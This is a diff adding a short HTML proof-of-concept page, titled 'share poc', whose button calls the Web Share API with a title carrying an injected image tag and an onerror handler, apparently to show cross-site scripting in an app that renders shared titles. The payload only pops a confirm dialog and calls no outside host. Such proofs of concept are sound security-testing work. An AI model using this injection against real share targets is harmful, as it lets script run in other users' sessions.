@@ -1,0 +1,23 @@
+<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>share poc</title>
+</head>
+<body>
+  <button id="share">Share to xxxx</button>
+
+  <script>
+    document.getElementById('share').onclick = async () => {
+      try {
+        await navigator.share({
+          title: '</a><img src=x onerror=confirm(1)>',
+          text: 'https://example.com'
+        });
+      } catch (e) {
+        console.log(e);
+      }
+    };
+  </script>
+</body>
+</html>
